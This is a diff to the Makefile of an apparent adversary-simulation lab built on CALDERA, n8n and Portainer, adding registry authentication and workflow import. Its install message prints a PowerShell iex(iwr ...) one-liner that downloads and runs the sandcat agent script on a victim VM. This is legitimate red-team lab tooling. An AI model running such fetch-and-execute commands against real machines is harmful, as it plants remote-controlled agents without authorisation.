@@ -44,7 +44,7 @@ help:
 # ── Install (first-time) ──────────────────────────────────────────────────────
 
 .PHONY: install
-install: _install-deps _check-docker _env _setup-ai _detect-labops _generate-caldera-keys _pull-caldera _up _wait-healthy sandcat profiles mitre-update
+install: _install-deps _check-docker _env _setup-ai _detect-labops _generate-caldera-keys _ghcr-auth _pull-caldera _up _wait-healthy _import-workflows sandcat profiles mitre-update
 	@echo ""
 	@echo "╔══════════════════════════════════════════════════════════════╗"
 	@echo "║   Sophos Adversary Simulation Platform — Ready              ║"
@@ -57,7 +57,10 @@ install: _install-deps _check-docker _env _setup-ai _detect-labops _generate-cal
 	@echo "  Portainer:      http://localhost:9000"
 	@echo ""
 	@echo "  Next: deploy sandcat agent to victim VM:"
-	@echo "    powershell -c \"iex(iwr 'http://localhost:8080/s.ps1' -UseBasicParsing)\""
+	@echo "    1. On the victim VM (PowerShell as Admin), set the CALDERA server IP:"
+	@echo '       $$env:CALDERA_SERVER = "<your-docker-host-ip>"'
+	@echo "    2. Then run:"
+	@echo "       powershell -c \"iex(iwr 'http://<your-docker-host-ip>:8081/s.ps1' -UseBasicParsing)\""
 	@echo ""
 
 # ── Core stack operations ─────────────────────────────────────────────────────
@@ -280,9 +283,9 @@ _env:
 		echo "   Generating N8N_PASSWORD..."; \
 		NEW_PW=$$(python3 -c "import secrets; print(secrets.token_urlsafe(16))"); \
 		if [ "$$(uname)" = "Darwin" ]; then \
-			sed -i '' "s/^N8N_PASSWORD=$$/N8N_PASSWORD=$$NEW_PW/" .env; \
+			sed -i '' "s/^N8N_PASSWORD=.*/N8N_PASSWORD=$$NEW_PW/" .env; \
 		else \
-			sed -i "s/^N8N_PASSWORD=$$/N8N_PASSWORD=$$NEW_PW/" .env; \
+			sed -i "s/^N8N_PASSWORD=.*/N8N_PASSWORD=$$NEW_PW/" .env; \
 		fi; \
 		echo "✅ N8N_PASSWORD auto-generated: $$NEW_PW"; \
 	else \
@@ -309,19 +312,40 @@ _detect-labops:
 .PHONY: _generate-caldera-keys
 _generate-caldera-keys:
 	@echo "▶ Checking CALDERA crypto keys..."
-	@if grep -q 'PLACEHOLDER_SALT' caldera/conf/local.yml 2>/dev/null; then \
+	@if grep -q 'PLACEHOLDER_SALT_REPLACE_ON_INSTALL' caldera/conf/local.yml 2>/dev/null; then \
 		NEW_SALT=$$(python3 -c "import secrets; print(secrets.token_hex(32))"); \
-		sed -i '' "s/PLACEHOLDER_SALT/$$NEW_SALT/g" caldera/conf/local.yml; \
+		sed -i '' "s/PLACEHOLDER_SALT_REPLACE_ON_INSTALL/$$NEW_SALT/g" caldera/conf/local.yml; \
 		echo "✅ Generated new crypt_salt"; \
 	else \
 		echo "✅ crypt_salt already set"; \
 	fi
-	@if grep -q 'PLACEHOLDER_KEY' caldera/conf/local.yml 2>/dev/null; then \
+	@if grep -q 'PLACEHOLDER_KEY_REPLACE_ON_INSTALL' caldera/conf/local.yml 2>/dev/null; then \
 		NEW_KEY=$$(python3 -c "import secrets; print(secrets.token_hex(32))"); \
-		sed -i '' "s/PLACEHOLDER_KEY/$$NEW_KEY/g" caldera/conf/local.yml; \
+		sed -i '' "s/PLACEHOLDER_KEY_REPLACE_ON_INSTALL/$$NEW_KEY/g" caldera/conf/local.yml; \
 		echo "✅ Generated new encryption_key"; \
 	else \
 		echo "✅ encryption_key already set"; \
+	fi
+
+.PHONY: _ghcr-auth
+_ghcr-auth:
+	@# ── GitHub CLI (for GHCR auth) ──
+	@if command -v gh >/dev/null 2>&1; then \
+		echo "✅ GitHub CLI is installed"; \
+	else \
+		echo "▶ Installing GitHub CLI..."; \
+		brew install gh; \
+		echo "✅ GitHub CLI installed"; \
+	fi
+	@# ── GHCR Authentication ──
+	@if docker pull --quiet ghcr.io/jclark2496/caldera:5.1.0 > /dev/null 2>&1; then \
+		echo "✅ GHCR authentication verified"; \
+	else \
+		echo "▶ Authenticating to GitHub Container Registry..."; \
+		echo "  You need a GitHub account with access to jclark2496/caldera"; \
+		gh auth login; \
+		gh auth refresh -s read:packages; \
+		echo $$(gh auth token) | docker login ghcr.io -u jclark2496 --password-stdin; \
 	fi
 
 .PHONY: _pull-caldera
@@ -362,6 +386,43 @@ _wait-healthy:
 		printf "."; \
 		sleep 5; \
 	done
+
+.PHONY: _import-workflows
+_import-workflows:
+	@echo "▶ Importing n8n workflows..."
+	@N8N_PORT=$$(grep '^N8N_PORT=' .env 2>/dev/null | cut -d'=' -f2-); \
+	N8N_PORT=$${N8N_PORT:-5679}; \
+	N8N_PW=$$(grep '^N8N_PASSWORD=' .env 2>/dev/null | cut -d'=' -f2-); \
+	echo "  Waiting for n8n API on port $$N8N_PORT..."; \
+	for i in $$(seq 1 24); do \
+		if curl -sf http://localhost:$$N8N_PORT/api/v1/workflows -H "Content-Type: application/json" \
+			-u "admin@localhost:$$N8N_PW" > /dev/null 2>&1; then \
+			break; \
+		fi; \
+		if [ $$i -eq 24 ]; then \
+			echo "⚠️  n8n API not reachable — skipping workflow import"; \
+			exit 0; \
+		fi; \
+		sleep 5; \
+	done; \
+	for f in n8n/workflows/*.json; do \
+		WF_NAME=$$(basename "$$f" .json); \
+		echo "  Importing $$WF_NAME..."; \
+		RESP=$$(curl -sf -X POST "http://localhost:$$N8N_PORT/api/v1/workflows" \
+			-H "Content-Type: application/json" \
+			-u "admin@localhost:$$N8N_PW" \
+			-d @"$$f" 2>&1) && \
+		WF_ID=$$(echo "$$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null) && \
+		if [ -n "$$WF_ID" ]; then \
+			curl -sf -X POST "http://localhost:$$N8N_PORT/api/v1/workflows/$$WF_ID/activate" \
+				-H "Content-Type: application/json" \
+				-u "admin@localhost:$$N8N_PW" > /dev/null 2>&1; \
+			echo "    ✅ $$WF_NAME imported and activated (ID: $$WF_ID)"; \
+		else \
+			echo "    ⚠️  $$WF_NAME import returned unexpected response"; \
+		fi || echo "    ⚠️  $$WF_NAME import failed (may already exist)"; \
+	done; \
+	echo "✅ Workflow import complete"
 
 # ── Cleanup ───────────────────────────────────────────────────────────────────
 
